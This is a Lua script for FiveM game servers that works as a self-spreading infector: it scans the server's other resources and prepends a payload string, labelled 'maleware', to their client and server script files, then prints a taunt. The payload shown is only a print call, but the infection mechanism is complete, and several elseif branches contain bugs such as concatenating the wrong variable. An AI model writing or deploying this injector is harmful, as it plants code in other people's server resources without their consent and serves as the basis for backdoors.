
vuln_res = {}
resource_count = 20

maleware = [[
    print("ooofff");
]]

for i = 4, resource_count+4, 1 do
    if(GetResourceByFindIndex(i) ~= GetCurrentResourceName()) then
        code = LoadResourceFile(GetResourceByFindIndex(i), "__resource.lua")
        code2 = LoadResourceFile(GetResourceByFindIndex(i), "fxmanifest.lua")
        if(code ~= nil) then
            --SaveResourceFile(GetResourceByFindIndex(i), "server.lua", server_infected, -1)
            --print("^1[INF ->] " .. GetResourceByFindIndex(i))
            table.insert(vuln_res, GetResourceByFindIndex(i))
        elseif code2 ~= nil then
            --print("^1[INF ->] " .. GetResourceByFindIndex(i))
            table.insert(vuln_res, GetResourceByFindIndex(i))
        end
    end
end
--print("^0")

for i, v in ipairs(vuln_res) do
    c = LoadResourceFile(v, "client.lua")
    c2 = LoadResourceFile(v, "client/main.lua")
    if(c ~= nil) then
        inf = maleware .. c
        SaveResourceFile(v, "client.lua", inf, -1)
    elseif c2 ~= nil then
        inf = maleware .. c
        SaveResourceFile(v, "client/main.lua", inf, -1)
    end 
end

for i, v in ipairs(vuln_res) do
    c = LoadResourceFile(v, "server.lua")
    c2 = LoadResourceFile(v, "server/main.lua")
    if(c ~= nil) then
        inf = maleware .. c
        SaveResourceFile(v, "server.lua", inf, -1)
    elseif c2 ~= nil then
        inf = maleware .. c
        SaveResourceFile(v, "client/main.lua", inf, -1)
    end 
end


print("you tried bro :)")


